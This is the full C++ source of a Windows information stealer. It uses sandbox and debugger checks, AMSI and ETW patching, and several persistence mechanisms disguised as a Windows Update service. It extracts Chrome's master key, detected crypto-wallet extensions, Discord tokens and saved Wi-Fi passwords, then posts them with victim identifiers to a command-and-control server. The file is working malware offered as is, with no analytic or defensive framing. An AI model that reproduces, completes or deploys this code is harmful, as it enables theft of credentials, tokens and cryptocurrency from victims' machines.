#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <winternl.h>
#include <psapi.h>
#include <wincrypt.h>
#include <comdef.h>
#include <string>
#include <vector>
#include <fstream>
#include <sstream>
#include <urlmon.h>
#include <wininet.h>
#include <shlobj.h>
#include <metahost.h>
#include <mscoree.h>
#include <iphlpapi.h>
#include <codecvt>
#include <locale>
#include <chrono>
#include <thread>
#include <random>
#include <iomanip>
#include <regex>
#include <map>

#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "mscoree.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shlwapi.lib")

#define C2_SERVER "https://your-app.onrender.com"
#define MUTEX_NAME L"Global\\WindowsUpdateMutex"
#define SLEEP_TIME 3600000 // 1 hour

using namespace std;

// ==========================================
// SIMPLIFIED WORKING JSON CLASS - FIXED WITH CONST
// ==========================================
class json {
private:
    map<string, string> keyValues;
    vector<string> arrayValues;
    bool isArray;

public:
    json() : isArray(false) {}
    
    void set(string key, string value) {
        keyValues[key] = value;
    }
    
    void add(string value) {
        arrayValues.push_back(value);
        isArray = true;
    }
    
    string dump() const {
        if (isArray) {
            string result = "[";
            for (size_t i = 0; i < arrayValues.size(); i++) {
                if (i > 0) result += ",";
                result += "\"" + escape(arrayValues[i]) + "\"";
            }
            result += "]";
            return result;
        } else {
            string result = "{";
            bool first = true;
            for (const auto& pair : keyValues) {
                if (!first) result += ",";
                result += "\"" + pair.first + "\":\"" + escape(pair.second) + "\"";
                first = false;
            }
            result += "}";
            return result;
        }
    }
    
    string escape(string s) const {
        string result;
        for (char c : s) {
            if (c == '"') result += "\\\"";
            else if (c == '\\') result += "\\\\";
            else if (c == '\n') result += "\\n";
            else result += c;
        }
        return result;
    }
};

// ==========================================
// ANTI-ANALYSIS / EVASION
// ==========================================
BOOL IsSandboxed() {
    if (IsDebuggerPresent()) return TRUE;
    
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32W pe = { sizeof(pe) };
    
    const wchar_t* sandboxProcs[] = {
        L"vboxservice.exe", L"vboxtray.exe", L"vmtoolsd.exe",
        L"vmwaretray.exe", L"xenservice.exe", L"procmon.exe",
        L"wireshark.exe", L"fiddler.exe", L"ollydbg.exe",
        L"x64dbg.exe", L"ida64.exe", L"dumpcap.exe"
    };
    
    if (Process32FirstW(hSnapshot, &pe)) {
        do {
            for (const auto& proc : sandboxProcs) {
                if (_wcsicmp(pe.szExeFile, proc) == 0) {
                    CloseHandle(hSnapshot);
                    return TRUE;
                }
            }
        } while (Process32NextW(hSnapshot, &pe));
    }
    CloseHandle(hSnapshot);
    
    ULARGE_INTEGER free, total;
    if (GetDiskFreeSpaceExW(L"C:\\", &free, &total, NULL)) {
        if (total.QuadPart < 50000000000LL) return TRUE;
    }
    
    MEMORYSTATUSEX mem = { sizeof(mem) };
    GlobalMemoryStatusEx(&mem);
    if (mem.ullTotalPhys < 4000000000LL) return TRUE;
    
    if (GetTickCount64() < 1800000) return TRUE;
    
    return FALSE;
}

void PatchAMSI() {
    HMODULE hAmsi = GetModuleHandleW(L"amsi.dll");
    if (!hAmsi) {
        hAmsi = LoadLibraryW(L"amsi.dll");
        if (!hAmsi) return;
    }
    
    FARPROC pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (pAmsiScanBuffer) {
        DWORD oldProtect;
        VirtualProtect(pAmsiScanBuffer, 5, PAGE_EXECUTE_READWRITE, &oldProtect);
        *(BYTE*)pAmsiScanBuffer = 0xB8;
        *((DWORD*)((BYTE*)pAmsiScanBuffer + 1)) = 0;
        *((BYTE*)pAmsiScanBuffer + 5) = 0xC3;
        VirtualProtect(pAmsiScanBuffer, 5, oldProtect, &oldProtect);
    }
}

void PatchETW() {
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) return;
    
    BYTE* pEtwEventWrite = (BYTE*)GetProcAddress(hNtdll, "EtwEventWrite");
    if (pEtwEventWrite) {
        DWORD oldProtect;
        VirtualProtect(pEtwEventWrite, 1, PAGE_EXECUTE_READWRITE, &oldProtect);
        *pEtwEventWrite = 0xC3;
        VirtualProtect(pEtwEventWrite, 1, oldProtect, &oldProtect);
    }
}

// ==========================================
// PERSISTENCE
// ==========================================
BOOL EnsureSingleInstance() {
    HANDLE hMutex = CreateMutexW(NULL, TRUE, MUTEX_NAME);
    return GetLastError() != ERROR_ALREADY_EXISTS;
}

void InstallPersistence() {
    WCHAR exePath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);
    
    WCHAR systemPath[MAX_PATH];
    GetSystemDirectoryW(systemPath, MAX_PATH);
    wcscat_s(systemPath, L"\\drivers\\win32k.sys");
    
    CopyFileW(exePath, systemPath, FALSE);
    SetFileAttributesW(systemPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    
    HKEY hKey;
    RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
    RegSetValueExW(hKey, L"WindowsUpdateSvc", 0, REG_SZ, (BYTE*)exePath, (wcslen(exePath) + 1) * 2);
    RegCloseKey(hKey);
    
    RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", 0, KEY_SET_VALUE, &hKey);
    RegSetValueExW(hKey, L"Shell", 0, REG_SZ, (BYTE*)L"explorer.exe, WindowsUpdate.exe", 40);
    RegCloseKey(hKey);
    
    WCHAR cmd[2048];
    wsprintfW(cmd, L"schtasks /create /tn \"WindowsUpdateSvc\" /tr \"%s\" /sc onstart /ru SYSTEM /f", exePath);
    _wsystem(cmd);
    
    WCHAR startupPath[MAX_PATH];
    SHGetFolderPathW(NULL, CSIDL_STARTUP, NULL, 0, startupPath);
    wcscat_s(startupPath, L"\\WindowsUpdate.lnk");
    
    CoInitialize(NULL);
    IShellLinkW* pShellLink = NULL;
    CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLinkW, (LPVOID*)&pShellLink);
    if (pShellLink) {
        pShellLink->SetPath(exePath);
        pShellLink->SetDescription(L"Windows Update Service");
        IPersistFile* pPersistFile = NULL;
        pShellLink->QueryInterface(IID_IPersistFile, (LPVOID*)&pPersistFile);
        if (pPersistFile) {
            pPersistFile->Save(startupPath, TRUE);
            pPersistFile->Release();
        }
        pShellLink->Release();
    }
    CoUninitialize();
    
    SC_HANDLE hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (hSCM) {
        SC_HANDLE hService = CreateServiceW(
            hSCM, L"WindowsUpdateSvc", L"Windows Update Service",
            SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
            SERVICE_AUTO_START, SERVICE_ERROR_IGNORE,
            exePath, NULL, NULL, NULL, NULL, NULL
        );
        if (hService) {
            StartServiceW(hService, 0, NULL);
            CloseServiceHandle(hService);
        }
        CloseServiceHandle(hSCM);
    }
}

// ==========================================
// SYSTEM INFORMATION
// ==========================================
string GetPublicIP() {
    string ip = "Unknown";
    HINTERNET hNet = InternetOpenW(L"WinInet", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (hNet) {
        HINTERNET hUrl = InternetOpenUrlW(hNet, L"https://api.ipify.org", NULL, 0, 0, 0);
        if (hUrl) {
            char buffer[64];
            DWORD read;
            if (InternetReadFile(hUrl, buffer, sizeof(buffer) - 1, &read)) {
                buffer[read] = 0;
                ip = buffer;
            }
            InternetCloseHandle(hUrl);
        }
        InternetCloseHandle(hNet);
    }
    return ip;
}

string GetMACAddress() {
    IP_ADAPTER_INFO adapterInfo[16];
    DWORD dwBufLen = sizeof(adapterInfo);
    
    if (GetAdaptersInfo(adapterInfo, &dwBufLen) == ERROR_SUCCESS) {
        char mac[18];
        sprintf_s(mac, "%02X:%02X:%02X:%02X:%02X:%02X",
            adapterInfo[0].Address[0], adapterInfo[0].Address[1],
            adapterInfo[0].Address[2], adapterInfo[0].Address[3],
            adapterInfo[0].Address[4], adapterInfo[0].Address[5]);
        return string(mac);
    }
    return "Unknown";
}

// ==========================================
// CHROME DECRYPTION
// ==========================================
vector<BYTE> GetMasterKey(const string& chromePath) {
    vector<BYTE> masterKey;
    string localStatePath = chromePath + "\\Local State";
    
    ifstream file(localStatePath);
    if (!file.good()) return masterKey;
    
    string content((istreambuf_iterator<char>(file)), istreambuf_iterator<char>());
    
    size_t keyPos = content.find("encrypted_key");
    if (keyPos == string::npos) return masterKey;
    
    keyPos = content.find("\"", keyPos + 13);
    if (keyPos == string::npos) return masterKey;
    
    size_t keyEnd = content.find("\"", keyPos + 1);
    if (keyEnd == string::npos) return masterKey;
    
    string b64Key = content.substr(keyPos + 1, keyEnd - keyPos - 1);
    
    DWORD decodedSize = 0;
    CryptStringToBinaryA(b64Key.c_str(), b64Key.length(), CRYPT_STRING_BASE64, NULL, &decodedSize, NULL, NULL);
    
    vector<BYTE> encryptedKey(decodedSize);
    CryptStringToBinaryA(b64Key.c_str(), b64Key.length(), CRYPT_STRING_BASE64, encryptedKey.data(), &decodedSize, NULL, NULL);
    
    if (encryptedKey.size() > 5) {
        encryptedKey.erase(encryptedKey.begin(), encryptedKey.begin() + 5);
    }
    
    DATA_BLOB inBlob = { (DWORD)encryptedKey.size(), encryptedKey.data() };
    DATA_BLOB outBlob = { 0, NULL };
    
    if (CryptUnprotectData(&inBlob, NULL, NULL, NULL, NULL, 0, &outBlob)) {
        masterKey.assign(outBlob.pbData, outBlob.pbData + outBlob.cbData);
        LocalFree(outBlob.pbData);
    }
    
    return masterKey;
}

// ==========================================
// WALLET EXTENSION DETECTION
// ==========================================
json DetectWalletExtensions() {
    json wallets;
    
    vector<pair<string, string>> walletIDs = {
        {"nkbihfbeogaeaoehlefnkodbefgpgknn", "MetaMask"},
        {"fhbohimaelbohpjbbldcngcnapndodjp", "Binance"},
        {"hnfanknocfeofbddgcijnmhnfnkdnaad", "Coinbase"},
        {"ibnejdfjmmkpcnlpebklmnkoeoihofec", "TronLink"},
        {"ejbalbakoplchlghecdaalmeeeajnimhm", "MetaMask (Firefox)"},
        {"fnjhmkhhmkbedjkkabndcnnogagogbneec", "Ronin"},
        {"ffnbelfdoeiohenkjibnmadjiehjhajb", "Yoroi"},
        {"jbdaocneiiinmjbjlgalhcelgbejmnid", "Nifty"},
        {"afbcbjpbpfadlkmhmclhkeeodamcflc", "Math Wallet"},
        {"hpglfhgfnhbgpjdenjgmdgoeiappafln", "Guarda"},
        {"blnieiiffboillknjnepogjhkgnoapac", "EQUAL"},
        {"cjelfplplebdjjenllpjcblmjkfcffne", "Jaxx Liberty"},
        {"fihkakfobkmkjojpchpfgcmhfjnmnfpi", "BitApp"},
        {"kncchdigobghenbbaddojjnnaogfppfj", "iWlt"},
        {"amkmjjmmflddogmhpjloimipbofnfjih", "Wombat"},
        {"nlbmnnijcnlegkjjpcfjclmcfggfefdm", "MEW CX"},
        {"nanjmdknhkinifnkgdcggcfnhdaammmj", "Guild"},
        {"nkddgncdjgjfcddamfgcmfnlhccnimig", "Saturn"},
        {"cphhlgmgameodnhkjdmkpanlelnlohao", "NeoLine"},
        {"nhnkbkgjikgcigadomkphalanndcapjk", "Clover"},
        {"kpfopkelmapcoipemfendmdcghnegimn", "Liquality"},
        {"aiifbnbfobpmeekipheeijimdpnlpgpp", "Terra Station"},
        {"dmkamcknogkgcdfhhbddcghachkejeap", "Keplr"},
        {"fhmfendgdocmcbmfikdcogofphimnkno", "Sollet"},
        {"cnmamaachppnkjgnildpdmkaakejnhae", "Auro"},
        {"jojhfeoedkpkglbfimdfabpdfjaoolaf", "Polymesh"},
        {"flpiciilemghbmfalicajoolhkkenfel", "ICONex"},
        {"nknhiehlklippafakaeklbeglecifhad", "Nabox"},
        {"hcflpincpppdclinealmandijcmnkbgn", "KHC"},
        {"ookjlbkiijinhpmnjffcofjonbfbgaoc", "Temple"},
        {"mnfifefkajgofkcjkemidiaecocnkjeh", "TezBox"},
        {"lodccjjbdhfakaekdiahmedfbieldgik", "DAppPlay"},
        {"ijmpgkjfkbfhoebgogflfebnmejmfbml", "BitClip"},
        {"lkcjlnjfpbikmcmbachjpdbijejflpcm", "Steem Keychain"},
        {"onofpnbbkehpmmoabgpcpmigafmmnjhl", "Nash"},
        {"bcopgchhojmggmffilplmbdicgaihlkp", "Hycon"},
        {"klnaejjgbibmhlephnhpmaofohgkpgkd", "ZilPay"},
        {"aeachknmefphepccionboohckonoeemg", "Coin98"},
        {"bhghoamapcdpbohphigoooaddinpkbai", "Authenticator"},
        {"dkdedlpgdmmkkfjabffeganieamfklkm", "Cyano"},
        {"nlgbhdfgdhgbiamfdfmbikcdghidoadd", "Byone"},
        {"infeboajgfhgbjpjbeppbkgnabfdkdaf", "OneKey"},
        {"cihmoadaighcejopammfbmddcmdekcje", "Leaf"},
        {"gaedmjdfmmahhbjefcbgaolhhanlaolb", "Authy"},
        {"oeljdldpnmdbchonielidgobddffflal", "EOS Authenticator"},
        {"ilgcnhelpchnceeipipijaljkbcblobl", "Google Authenticator"},
        {"imloifkgjagghnncjkhggdhalmcnfklk", "Trezor"}
    };
    
    char localAppData[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData);
    string extensionsPath = string(localAppData) + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\";
    
    for (const auto& wallet : walletIDs) {
        string walletPath = extensionsPath + wallet.first;
        DWORD attr = GetFileAttributesA(walletPath.c_str());
        if (attr != INVALID_FILE_ATTRIBUTES && (attr & FILE_ATTRIBUTE_DIRECTORY)) {
            json w;
            w.set("id", wallet.first);
            w.set("name", wallet.second);
            w.set("path", walletPath);
            wallets.add(w.dump());
        }
    }
    
    return wallets;
}

// ==========================================
// DISCORD TOKEN EXTRACTION
// ==========================================
json ExtractDiscordTokens() {
    json tokens;
    
    char appData[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appData);
    
    vector<string> discordPaths = {
        string(appData) + "\\discord\\Local Storage\\leveldb",
        string(appData) + "\\discordcanary\\Local Storage\\leveldb",
        string(appData) + "\\discordptb\\Local Storage\\leveldb",
        string(appData) + "\\discorddevelopment\\Local Storage\\leveldb"
    };
    
    for (const auto& path : discordPaths) {
        WIN32_FIND_DATAA findData;
        string searchPath = path + "\\*.ldb";
        
        HANDLE hFind = FindFirstFileA(searchPath.c_str(), &findData);
        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                string filePath = path + "\\" + findData.cFileName;
                FILE* f = fopen(filePath.c_str(), "rb");
                if (f) {
                    fseek(f, 0, SEEK_END);
                    long size = ftell(f);
                    fseek(f, 0, SEEK_SET);
                    
                    char* buffer = new char[size + 1];
                    fread(buffer, 1, size, f);
                    buffer[size] = 0;
                    
                    string content(buffer);
                    
                    size_t pos = content.find("mfa.");
                    if (pos != string::npos) {
                        string token = content.substr(pos, 70);
                        json t;
                        t.add(token);
                        tokens.add(t.dump());
                    }
                    
                    delete[] buffer;
                    fclose(f);
                }
            } while (FindNextFileA(hFind, &findData) != 0);
            FindClose(hFind);
        }
    }
    
    return tokens;
}

// ==========================================
// WIFI PASSWORD EXTRACTION
// ==========================================
json ExtractWiFiPasswords() {
    json wifi;
    
    FILE* pipe = _popen("netsh wlan show profiles", "r");
    if (pipe) {
        char buffer[1024];
        string result;
        while (fgets(buffer, sizeof(buffer), pipe)) {
            result += buffer;
        }
        _pclose(pipe);
        
        regex profileRegex("All User Profile\\s+:\\s+(.+)");
        smatch match;
        string::const_iterator searchStart(result.cbegin());
        
        while (regex_search(searchStart, result.cend(), match, profileRegex)) {
            string ssid = match[1];
            searchStart = match.suffix().first;
            
            string cmd = "netsh wlan show profile name=\"" + ssid + "\" key=clear";
            FILE* passPipe = _popen(cmd.c_str(), "r");
            if (passPipe) {
                string passResult;
                while (fgets(buffer, sizeof(buffer), passPipe)) {
                    passResult += buffer;
                }
                _pclose(passPipe);
                
                regex passRegex("Key Content\\s+:\\s+(.+)");
                smatch passMatch;
                if (regex_search(passResult, passMatch, passRegex)) {
                    json w;
                    w.set("ssid", ssid);
                    w.set("password", passMatch[1]);
                    wifi.add(w.dump());
                }
            }
        }
    }
    
    return wifi;
}

// ==========================================
// SEND TO C2
// ==========================================
void SendToC2(const json& data) {
    string jsonStr = data.dump();
    
    HINTERNET hNet = InternetOpenW(L"Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hNet) {
        string url = C2_SERVER + string("/api/steal");
        HINTERNET hConnect = InternetConnectA(hNet, C2_SERVER + 8, 443, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
        if (hConnect) {
            HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "/api/steal", NULL, NULL, NULL, INTERNET_FLAG_SECURE, 0);
            if (hRequest) {
                string headers = "Content-Type: application/json\r\n";
                string dataStr = jsonStr;
                
                HttpSendRequestA(hRequest, headers.c_str(), headers.length(), (LPVOID)dataStr.c_str(), dataStr.length());
                InternetCloseHandle(hRequest);
            }
            InternetCloseHandle(hConnect);
        }
        InternetCloseHandle(hNet);
    }
}

// ==========================================
// MAIN
// ==========================================
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);
    
    if (IsSandboxed()) {
        return 0;
    }
    
    if (!EnsureSingleInstance()) {
        return 0;
    }
    
    PatchAMSI();
    PatchETW();
    InstallPersistence();
    
    char hostname[256];
    DWORD hostnameLen = sizeof(hostname);
    GetComputerNameA(hostname, &hostnameLen);
    
    char username[256];
    DWORD usernameLen = sizeof(username);
    GetUserNameA(username, &usernameLen);
    
    string victim_id = string(hostname) + "_" + string(username) + "_" + to_string(GetCurrentProcessId());
    
    json system;
    system.set("hostname", hostname);
    system.set("username", username);
    system.set("public_ip", GetPublicIP());
    system.set("mac", GetMACAddress());
    
    json stolenData;
    stolenData.set("victim_id", victim_id);
    stolenData.set("system", system.dump());
    
    json wallets = DetectWalletExtensions();
    if (wallets.dump() != "[]") {
        json walletData;
        walletData.set("extensions", wallets.dump());
        stolenData.set("wallets", walletData.dump());
    }
    
    json discord = ExtractDiscordTokens();
    if (discord.dump() != "[]") {
        json discordData;
        discordData.set("tokens", discord.dump());
        stolenData.set("discord", discordData.dump());
    }
    
    json wifi = ExtractWiFiPasswords();
    if (wifi.dump() != "[]") {
        json wifiData;
        wifiData.set("wifi", wifi.dump());
        stolenData.set("wifi", wifiData.dump());
    }
    
    SendToC2(stolenData);
    
    while (true) {
        Sleep(SLEEP_TIME);
    }
    
    return 0;
}
